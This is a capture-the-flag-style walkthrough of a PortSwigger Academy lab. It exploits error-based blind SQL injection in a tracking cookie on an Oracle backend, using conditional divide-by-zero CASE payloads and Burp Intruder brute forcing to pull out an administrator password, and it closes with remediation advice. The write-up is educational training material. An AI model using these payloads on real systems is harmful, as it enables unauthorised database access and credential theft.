# PortSwigger Lab: Blind SQL Injection with Conditional Errors

**Difficulty:** Practitioner
**Target:** PortSwigger Web Security Academy

## Objective

The goal of this lab is to exploit a blind SQL injection vulnerability residing within the `TrackingId` cookie. Unlike previous labs, the application does not alter its page content (such as displaying a greeting banner) based on whether a query returns rows. However, if the SQL query causes a runtime or syntax error, the application returns a `500 Internal Server Error`. We must leverage conditional error logic to systematically extract the `administrator` password and log in.

## The Vulnerability Concept

Error-based blind SQL injection occurs when an application is vulnerable to SQL injection and suppresses query output, but fails to gracefully handle database exceptions without altering its HTTP response status code. By crafting SQL `CASE` expressions that intentionally trigger a database runtime error (such as dividing a number by zero: `1/0`) *only* when a specific condition evaluates to `TRUE`, attackers can use the resulting `500 Internal Server Error` vs. `200 OK` status codes as a binary oracle to infer data character by character.

## Step-by-Step Exploitation & Automation Workflow

### 1. Initial Reconnaissance & Interception

I started by reviewing the lab description, which established that the application uses an analytics tracking cookie and returns a custom error message when a SQL query causes an error.

![Lab Description](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Lab%20Description.png)

Next, I launched the lab environment and browsed the main storefront page to observe the application's baseline behavior. Notice that no "Welcome back" message appears on the page.

![Storefront Home](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Storefront%20Home.png)

Using Burp Suite, I inspected the **Proxy HTTP history** to capture the initial `GET /` request containing the `TrackingId` cookie (`TrackingId=sP5WCMauvFdNP8Wt`).

![Proxy HTTP History](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Proxy%20HTTP%20History.png)

I sent this request over to **Burp Repeater** so I could manipulate the `TrackingId` cookie and observe the HTTP status codes directly.

![Burp Repeater Setup](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Burp%20Repeater%20Setup.png)

### 2. Confirming the Error-Based Injection Vector & DBMS Type

To test if the `TrackingId` cookie was vulnerable to SQL injection, I injected a single quote (`'`) right after the cookie value (`TrackingId=sP5WCMauvFdNP8Wt'`). This unclosed string broke the query syntax and caused the server to return an `HTTP/2 500 Internal Server Error`.

![Injecting Single Quote - 500 Error](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Injecting%20Single%20Quote%20-%20500%20Error.png)

Next, I injected a second single quote (`TrackingId=sP5WCMauvFdNP8Wt''`) to escape the quote and repair the syntax. The server returned an `HTTP/2 200 OK`, proving that the input is being evaluated directly within the backend SQL query.

![Injecting Double Single Quote - 200 OK](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Injecting%20Double%20Single%20Quote%20-%20200%20OK.png)

To confirm if I could inject a subquery using string concatenation (`||`), I tested:
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+'x')||'`
This resulted in a `500 Internal Server Error`, which strongly suggests the backend is an **Oracle** database (since Oracle requires a `FROM` clause in every `SELECT` statement).

![Subquery Without FROM - 500 Error](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Subquery%20Without%20FROM%20-%20500%20Error.png)

To verify the Oracle hypothesis, I added `FROM dual` to the subquery:
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+'x'+FROM+dual)||'`
The server responded with an `HTTP/2 200 OK`, confirming we are dealing with an **Oracle** database.

![Subquery With FROM dual - 200 OK](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Subquery%20With%20FROM%20dual%20-%20200%20OK.png)

To be completely certain, I queried a non-existent table (`FROM dualabc`):
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+'x'+FROM+dualabc)||'`
As expected, this threw a `500 Internal Server Error`.

![Subquery With Invalid Table - 500 Error](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Subquery%20With%20Invalid%20Table%20-%20500%20Error.png)

### 3. Confirming the `users` Table and Target Account

Before attempting to extract credentials, I needed to verify that the `users` table exists. Because a subquery inside a concatenation operator can only return a single row (otherwise Oracle throws an `ORA-01427: single-row subquery returns more than one row` error), I first tested limiting the output with `FETCH FIRST 1 ROW ONLY`:
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+'x'+FROM+users+FETCH+FIRST+1+ROW+ONLY)||'`
This returned a `500 Internal Server Error` in this context.

![Testing FETCH FIRST 1 ROW ONLY - 500 Error](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Testing%20FETCH%20FIRST%201%20ROW%20ONLY%20-%20500%20Error.png)

Instead, I switched to Oracle's native `ROWNUM` pseudocolumn:
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+'x'+FROM+users+WHERE+rownum=1)||'`
This returned an `HTTP/2 200 OK`, confirming the `users` table exists and is accessible.

![Testing ROWNUM=1 - 200 OK](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Testing%20ROWNUM=1%20-%20200%20OK.png)

Next, I tested for the `administrator` account using a `WHERE` clause:
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+'x'+FROM+users+WHERE+username='administrator')||'`
This returned a `200 OK`.

![Testing Administrator Username - 200 OK](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Testing%20Administrator%20Username%20-%20200%20OK.png)

However, testing a non-existent username (`username='administratorabc'`) *also* returned a `200 OK` because concatenating an empty result (`NULL`) in Oracle simply evaluates to the original string without throwing an error.

![Testing Invalid Username - 200 OK](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Testing%20Invalid%20Username%20-%20200%20OK.png)

### 4. Constructing the Conditional Error Oracle

Because a `WHERE` clause alone doesn't trigger an error when false, we must use a `CASE` statement that forces a divide-by-zero runtime error (`TO_CHAR(1/0)`) when our condition is met.

First, I tested a false condition (`1=2`) against `dual`:
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+'x'+END+FROM+dual)||'`
Because `1=2` is false, the query skips `1/0` and returns `'x'`, resulting in a `200 OK`.

![CASE Statement False Condition - 200 OK](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/CASE%20Statement%20False%20Condition%20-%20200%20OK.png)

Next, I tested a true condition (`1=1`):
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'x'+END+FROM+dual)||'`
Because `1=1` is true, the database evaluates `1/0` and throws a `500 Internal Server Error`.

![CASE Statement True Condition - 500 Error](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/CASE%20Statement%20True%20Condition%20-%20500%20Error.png)

Now, combining the `CASE` statement with the `WHERE` clause on the `users` table allows us to verify usernames:
* If the `WHERE` clause finds no matching rows, the `SELECT` statement never evaluates the `CASE` expression, returning `200 OK`.
* If the `WHERE` clause *does* find a matching row, the `CASE WHEN (1=1)` expression executes `1/0` and triggers a `500 Internal Server Error`.

Testing a non-existent user (`username='administratora'`):
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'x'+END+FROM+users+WHERE+username='administratora')||'`
This returned a `200 OK` (False — user does not exist).

![Verifying Invalid User With CASE - 200 OK](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Verifying%20Invalid%20User%20With%20CASE%20-%20200%20OK.png)

Testing the valid `administrator` user (`username='administrator'`):
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'x'+END+FROM+users+WHERE+username='administrator')||'`
This returned a `500 Internal Server Error` (True — `administrator` exists!).

![Verifying Valid Administrator With CASE - 500 Error](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Verifying%20Valid%20Administrator%20With%20CASE%20-%20500%20Error.png)

### 5. Enumerating the Password Length

With a reliable error oracle established (`500` = True, `200` = False), I appended `AND LENGTH(password)>5` to the `WHERE` clause to start narrowing down the password length:
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'x'+END+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>5)||'`
This returned a `500 Internal Server Error` (True — password is longer than 5 characters).

![Testing Password Length > 5 - 500 Error](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Testing%20Password%20Length%20%205%20-%20500%20Error.png)

Next, I tested an upper bound of `30`:
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'x'+END+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>30)||'`
This returned a `200 OK` (False — password is not longer than 30 characters).

![Testing Password Length > 30 - 200 OK](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Testing%20Password%20Length%20%2030%20-%20200%20OK.png)

To find the exact length quickly, I sent the request to **Burp Intruder** and configured a **Sniper** attack. I placed the payload marker on the length value (`LENGTH(password)>§5§`) and set up a sequential **Numbers** payload from `5` to `30`.

![Intruder Sniper Setup for Password Length](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Intruder%20Sniper%20Setup%20for%20Password%20Length.png)

Running the attack showed that payloads `5` through `19` returned a `500` status code, while payload `20` and onwards returned a `200 OK`.

![Intruder Length Results Table](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Intruder%20Length%20Results%20Table.png)

Applying the Intruder view filter to hide `2xx`, `3xx`, and `4xx` responses isolated the `500` errors, confirming that `LENGTH(password)>19` was the highest true statement. Since the length is greater than 19 but *not* greater than 20, the password is confirmed to be **exactly 20 characters long**.

![Filtered Intruder Length Results](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Filtered%20Intruder%20Length%20Results.png)

### 6. Extracting the First Character (Sniper)

To extract individual characters in Oracle, we use the `SUBSTR()` function. I first tested extracting the first character manually in **Burp Repeater**:
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'x'+END+FROM+users+WHERE+username='administrator'+AND+SUBSTR(password,1,1)='a')||'`
This returned a `200 OK`, meaning the first character is not `'a'`.

![Testing SUBSTR in Repeater - 200 OK](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Testing%20SUBSTR%20in%20Repeater%20-%20200%20OK.png)

I sent this request to **Burp Intruder** to automate finding the first character using a **Sniper** attack. I placed the payload marker on the character value (`SUBSTR(password,1,1)='§a§'`) and configured a **Brute forcer** payload with the alphanumeric character set (`abcdefghijklmnopqrstuvwxyz0123456789`) of length 1.

![Intruder Sniper Setup for First Character](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Intruder%20Sniper%20Setup%20for%20First%20Character.png)

Running the 36-request attack tested every possible lowercase letter and digit. Looking at the results table, payload `z` (Request 26) stood out as the only request to return a `500` status code.

![Intruder First Character Results](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Intruder%20First%20Character%20Results.png)

Filtering the results to show only `5xx` responses isolated payload `z`, confirming the first character of the administrator's password is `z`.

![Filtered First Character Result - z](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Filtered%20First%20Character%20Result%20-%20z.png)

I opened Mousepad to track the 20 character positions and recorded `z` at position 1.

![Recording First Character in Mousepad](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Recording%20First%20Character%20in%20Mousepad.png)

### 7. Automating Full Password Extraction (Cluster Bomb)

To extract the remaining 19 characters simultaneously, I switched Burp Intruder to a **Cluster bomb** attack and defined two payload positions:
`TrackingId=sP5WCMauvFdNP8Wt'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'x'+END+FROM+users+WHERE+username='administrator'+AND+SUBSTR(password,§2§,1)='§a§')||'`

For **Payload position 1**, I configured a sequential **Numbers** payload from `2` to `20`.

![Cluster Bomb Payload 1 Configuration](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Cluster%20Bomb%20Payload%201%20Configuration.png)

For **Payload position 2**, I configured the **Brute forcer** payload with the lowercase alphanumeric set (`abcdefghijklmnopqrstuvwxyz0123456789`).

![Cluster Bomb Payload 2 Configuration](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Cluster%20Bomb%20Payload%202%20Configuration.png)

I started the Cluster bomb attack (684 total requests) and monitored the incoming responses.

![Cluster Bomb Attack Running](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Cluster%20Bomb%20Attack%20Running.png)

Once the attack finished, I applied the view filter to hide `2xx`, `3xx`, and `4xx` responses, leaving only the 19 requests that triggered a `500 Internal Server Error`.

![Filtered Cluster Bomb Results](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Filtered%20Cluster%20Bomb%20Results.png)

Sorting the filtered table by `Payload 1` (character index) from 2 to 20 allowed me to read `Payload 2` sequentially and assemble the complete 20-character password in Mousepad:
`zb232zys90mv67y8bupe`

![Assembling Full Password in Mousepad](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Assembling%20Full%20Password%20in%20Mousepad.png)

### 8. Authentication and Verification

With the administrator password (`zb232zys90mv67y8bupe`) fully extracted, I returned to the browser, navigated to the `/login` page, and entered the credentials for `administrator`.

![Logging in as Administrator](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Logging%20in%20as%20Administrator.png)

Upon submitting the form, the application authenticated the session, redirected me to the "My Account" page, and displayed the **"Congratulations, you solved the lab!"** banner.

![Lab Solved](images/Blind%20SQL%20Injection%20with%20Conditional%20Errors/Lab%20Solved.png)

## Remediation

To prevent error-based blind SQL injection vulnerabilities, developers must implement defense-in-depth:

1. **Use Parameterized Queries (Prepared Statements):** Ensure all database queries—including those utilizing cookies and HTTP headers—use parameterized queries so user input is strictly treated as literal data and can never alter query syntax or inject `CASE` expressions.
2. **Standardize Error Handling:** Configure the application to catch database exceptions gracefully and return generic, uniform HTTP responses rather than exposing unhandled `500 Internal Server Error` status codes that act as an oracle for attackers.